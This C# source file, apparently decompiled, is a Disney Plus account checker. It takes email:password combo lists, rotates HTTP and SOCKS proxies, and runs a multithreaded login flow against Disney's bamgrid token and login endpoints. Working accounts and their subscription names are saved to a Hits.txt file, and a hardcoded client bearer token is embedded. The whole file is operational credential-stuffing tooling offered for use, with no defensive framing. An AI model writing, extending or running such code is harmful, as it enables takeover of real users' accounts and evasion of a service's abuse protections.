using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Leaf.xNet;
using Colorful;
using System.Windows;
using System.Collections.Concurrent;
using System.IO;
using System.Net;
using System.Threading;
using System.Text.RegularExpressions;


namespace Disney_
{
	internal class important
	{

		public important(ConcurrentQueue<string> concurrentQueue_1, List<string> list_1, string string_4)
		{
			this.concurrentQueue_0 = concurrentQueue_1;
			this.list_0 = list_1;
			this.int_5 = this.concurrentQueue_0.Count;
			this.string_0 = string_4;
			this.string_1 = Directory.GetCurrentDirectory();
			this.string_2 = this.string_1 + "\\Results\\" + DateTime.Now.ToString("MM-dd-yyyy H.mm");
			this.string_3 = this.string_2 + "\\Hits.txt";
		}


		public void method_0()
		{
			if (!Directory.Exists("Results"))
			{
				Directory.CreateDirectory("Results");
			}
			if (!Directory.Exists(this.string_2))
			{
				Directory.CreateDirectory(this.string_2);
			}
			if (!File.Exists(this.string_3))
			{
				File.Create(this.string_3).Close();
			}
		}
		private void method_1(string string_4)
		{
			try
			{
				object obj = important.object_0;
				lock (obj)
				{
					using (FileStream fileStream = File.Open(this.string_3, FileMode.Append))
					{
						using (StreamWriter streamWriter = new StreamWriter(fileStream))
						{
							streamWriter.WriteLine(string_4);
						}
					}
				}
			}
			catch (Exception value)
			{
				Colorful.Console.WriteLine(value);
			}
		}



		private void method_2()
		{
			while (!this.concurrentQueue_0.IsEmpty)
			{
				string text;
				this.concurrentQueue_0.TryDequeue(out text);
				string[] array = text.Split(new char[]
				{
					':'
				});
				for (; ; )
				{
					HttpRequest httpRequest = new HttpRequest
					{
						KeepAliveTimeout = 5000,
						ConnectTimeout = 5000,
						ReadWriteTimeout = 5000,
						IgnoreProtocolErrors = true,
						AllowAutoRedirect = false,
						Proxy = null,
						KeepAlive = true,
						UseCookies = true
					};
					httpRequest.UserAgentRandomize();
					if (httpRequest.Proxy == null)
					{
						goto IL_389;
					}
				IL_2B:
					try
					{
						httpRequest.AddHeader("authorization", "Bearer ZGlzbmV5JmJyb3dzZXImMS4wLjA.Cu56AgSfBTDag5NiRA81oLHkDZfu5L3CKadnefEAY84");
						string text2 = httpRequest.Post("https://global.edge.bamgrid.com/devices", "{\"deviceFamily\":\"browser\",\"applicationRuntime\":\"chrome\",\"deviceProfile\":\"windows\",\"attributes\":{}}", "application/json").ToString();
						if (!text2.Contains("assertion"))
						{
							this.int_2++;
							httpRequest.Proxy = null;
							continue;
						}
						string value = Regex.Match(text2, "assertion\":\"(.+?)\"").Groups[1].Value;
						httpRequest.AddHeader("authorization", "Bearer ZGlzbmV5JmJyb3dzZXImMS4wLjA.Cu56AgSfBTDag5NiRA81oLHkDZfu5L3CKadnefEAY84");
						text2 = httpRequest.Post("https://global.edge.bamgrid.com/token", "grant_type=urn%3Aietf%3Aparams%3Aoauth%3Agrant-type%3Atoken-exchange&latitude=0&longitude=0&platform=browser&subject_token=" + value + "&subject_token_type=urn%3Abamtech%3Aparams%3Aoauth%3Atoken-type%3Adevice", "application/x-www-form-urlencoded").ToString();
						if (!text2.Contains("access_token"))
						{
							this.int_2++;
							httpRequest.Proxy = null;
							continue;
						}
						string value2 = Regex.Match(text2, "access_token\":\"(.+?)\"").Groups[1].Value;
						httpRequest.AddHeader("authorization", "Bearer " + value2);
						text2 = httpRequest.Post("https://global.edge.bamgrid.com/idp/login", string.Concat(new string[]
						{
							"{\"email\":\"",
							array[0],
							"\",\"password\":\"",
							array[1],
							"\"}"
						}), "application/json").ToString();
						if (text2.Contains("bad-credentials") || text2.Contains("is not a valid email Address at /email"))
						{
							this.int_1++;
							class3.int_0++;
							break;
						}
						if (!text2.Contains("Bearer"))
						{
							this.int_2++;
							httpRequest.Proxy = null;
							continue;
						}
						string value3 = Regex.Match(text2, "id_token\":\"(.+?)\"").Groups[1].Value;
						httpRequest.AddHeader("authorization", "Bearer " + value2);
						text2 = httpRequest.Post("https://global.edge.bamgrid.com/accounts/grant", "{\"id_token\":\"" + value3 + "\"}", "application/json").ToString();
						value = Regex.Match(text2, "assertion\":\"(.+?)\"").Groups[1].Value;
						httpRequest.AddHeader("authorization", "Bearer ZGlzbmV5JmJyb3dzZXImMS4wLjA.Cu56AgSfBTDag5NiRA81oLHkDZfu5L3CKadnefEAY84");
						text2 = httpRequest.Post("https://global.edge.bamgrid.com/token", "grant_type=urn%3Aietf%3Aparams%3Aoauth%3Agrant-type%3Atoken-exchange&latitude=0&longitude=0&platform=browser&subject_token=" + value + "&subject_token_type=urn%3Abamtech%3Aparams%3Aoauth%3Atoken-type%3Aaccount", "application/x-www-form-urlencoded").ToString();
						value2 = Regex.Match(text2, "access_token\":\"(.+?)\"").Groups[1].Value;
						httpRequest.AddHeader("authorization", "Bearer " + value2);
						text2 = httpRequest.Get("https://global.edge.bamgrid.com/subscriptions", null).ToString();
						if (text2.Contains("name"))
						{
							string value4 = Regex.Match(text2, "name\":\"(.+?)\"").Groups[1].Value;
							this.method_1(text + " | " + value4);
							Colorful.Console.WriteLine(text + " | " + value4, class3.color_0);
							this.int_0++;
							class3.int_0++;
							break;
						}
						this.int_3++;
						class3.int_0++;
						break;
					}
					catch
					{
						this.int_2++;
						httpRequest.Proxy = null;
						continue;
					}
				IL_389:
					if (this.string_0 == "1")
					{
						httpRequest.Proxy = HttpProxyClient.Parse(this.list_0[this.random_0.Next(this.list_0.Count)]);
						goto IL_2B;
					}
					if (this.string_0 == "2")
					{
						httpRequest.Proxy = Socks4ProxyClient.Parse(this.list_0[this.random_0.Next(this.list_0.Count)]);
						goto IL_2B;
					}
					httpRequest.Proxy = Socks5ProxyClient.Parse(this.list_0[this.random_0.Next(this.list_0.Count)]);
					goto IL_2B;
				}
			}
			Colorful.Console.ReadKey();
		}

		public void method_3(int int_7)
		{
			ServicePointManager.DefaultConnectionLimit = int_7 * 10;
			ServicePointManager.Expect100Continue = false;
			for (int i = 0; i < int_7; i++)
			{
				new Thread(new ThreadStart(this.method_2)).Start();
			}
		}

		public void method_4()
		{
			Task.Factory.StartNew(new Action(this.method_7));
		}



		public long method_5()
		{
			long num = 0L;
			foreach (KeyValuePair<long, long> keyValuePair in important.concurrentDictionary_0)
			{
				if (keyValuePair.Key >= DateTimeOffset.Now.ToUnixTimeSeconds() - 60L)
				{
					num += keyValuePair.Value;
				}
			}
			return num;
		}

		public void method_6()
		{
			Task.Factory.StartNew(new Action(important.Class2.class2_0.method_0));
		}


		private void method_7()
		{
			for (; ; )
			{
				this.int_6 = this.int_0 + this.int_1 + this.int_3;
				Colorful.Console.Title = string.Format("DisneyPlus {0}/{1} | Hits {2} - Frees {3} - Invalids {4} - Retries {5} - Errors {6} - Cpm {7}", new object[]
				{
					this.int_6,
					this.int_5,
					this.int_0,
					this.int_3,
					this.int_1,
					this.int_2,
					this.int_4,
					this.method_5()
				});
				Thread.Sleep(500);
			}
		}

		// Token: 0x04000008 RID: 8
		private int int_0;

		// Token: 0x04000009 RID: 9
		private int int_1;

		// Token: 0x0400000A RID: 10
		private int int_2;

		// Token: 0x0400000B RID: 11
		private int int_3;

		// Token: 0x0400000C RID: 12
		private int int_4;

		// Token: 0x0400000D RID: 13
		private int int_5;

		// Token: 0x0400000E RID: 14
		private int int_6;

		// Token: 0x0400000F RID: 15
		private string string_0;

		// Token: 0x04000010 RID: 16
		private Random random_0 = new Random();

		// Token: 0x04000011 RID: 17
		private ConcurrentQueue<string> concurrentQueue_0 = new ConcurrentQueue<string>();

		// Token: 0x04000012 RID: 18
		private List<string> list_0 = new List<string>();

		// Token: 0x04000013 RID: 19
		private static readonly ConcurrentDictionary<long, long> concurrentDictionary_0 = new ConcurrentDictionary<long, long>();

		// Token: 0x04000014 RID: 20
		private static readonly object object_0 = new object();

		// Token: 0x04000015 RID: 21
		private string string_1;

		// Token: 0x04000016 RID: 22
		private string string_2;

		// Token: 0x04000017 RID: 23
		private string string_3;


		[Serializable]
		private sealed class Class2
		{
			// Token: 0x0600001D RID: 29 RVA: 0x0000309C File Offset: 0x0000129C
			internal void method_0()
			{
				while (class3.bool_0)
				{
					important.concurrentDictionary_0.TryAdd(DateTimeOffset.Now.ToUnixTimeSeconds(), (long)class3.int_0);
					class3.int_0 = 0;
					Thread.Sleep(1000);
				}
			}

			public static readonly important.Class2 class2_0 = new important.Class2();

			// Token: 0x04000019 RID: 25
			public static Action action_0;















		}
	}
}